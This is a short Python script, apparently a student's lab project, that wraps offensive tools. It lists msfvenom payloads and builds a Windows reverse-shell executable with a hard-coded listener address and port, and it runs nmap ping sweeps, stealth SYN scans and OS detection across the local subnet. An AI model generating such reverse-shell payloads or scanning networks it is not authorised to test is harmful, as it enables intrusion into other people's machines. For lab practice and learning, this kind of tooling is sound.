#!/usr/bin/env python3                # specify the interpreter


### IMPORT STATEMENTS ###
import sys  # import the sys library
import subprocess # import the subprocess library
import socket # import the socket library


### HELPER FUNCTIONS ###
def get_local():  # calls ifconfig
    return_code = subprocess.call(['ifconfig'])
    print("output:", return_code)

def list_payloads(): # lists all the msfvenom payloads
    return_code = subprocess.call(['msfvenom','-l','payloads'])
    print("output:", return_code)

def windows_reverse_payload(): # creates a payload for a windows machine with all the options hard coded
    return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
    print("output:", return_code)

def get_ip(): # gets ip address of local computer
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    return ip_address

def get_subnet(): # gets the first three octets of the local hosts ipv4 address and adds 1-255
    local_address = get_ip()
    ipremoved =''.join(local_address.rpartition('.')[:2])
    subnet = ipremoved + "1-255"
    return subnet

def ping_sweep(): # does a sweep of the local network using nmap
    subnet = get_subnet()
    return_code = subprocess.call(['nmap','-sP',subnet])
    return return_code
    
def ping_scan(): # does a stealth scan for machines with open ports in the local network using nmap
    subnet = get_subnet()
    return_code = subprocess.call(['sudo','nmap','-sS',subnet])
    return return_code

def os_scan(): # tries to find the os of machines on the local network
    subnet = get_subnet()
    return_code = subprocess.call(['sudo','nmap','-O',subnet])
    return return_code


### MAIN FUNCTION ###
def main():  # define a main function
    print(ping_sweep())
    # pinging = ping_sweep()
    # print(pinging)
    # print(get_ip())
    # print(os_scan)


### DUNDER CHECK ###
if __name__ == '__main__':  # dunder check
    main()  # call the main function